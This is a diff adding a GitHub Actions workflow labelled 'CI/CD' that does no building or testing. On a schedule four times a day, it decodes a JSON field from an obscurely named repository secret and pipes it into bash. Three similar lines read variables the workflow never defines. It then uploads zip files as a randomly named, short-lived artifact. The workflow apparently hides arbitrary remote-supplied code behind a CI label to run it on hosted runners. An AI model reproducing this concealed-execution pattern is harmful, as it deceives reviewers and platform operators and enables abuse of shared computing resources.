@@ -1,0 +1,31 @@
+name: CI/CD
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '54 5,11,17,23 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  main:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - uses: actions/checkout@v4
+      - name: Process
+        env:
+          hgy553: ${{ secrets.hgy553 }}
+        run: |
+          printf '%s' "$hgy553" | jq -r .xkrqr43 | /bin/bash
+          printf '%s' "$vnynp61" | jq -r .dx3002 | /bin/bash
+          printf '%s' "$nhp45199" | jq -r .zhcgp48 | /bin/bash
+          printf '%s' "$wpli70" | jq -r .f1220 | /bin/bash
+
+      - name: Archive output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: oC2CHXxw
+          path: "*.zip"
+          retention-days: 1
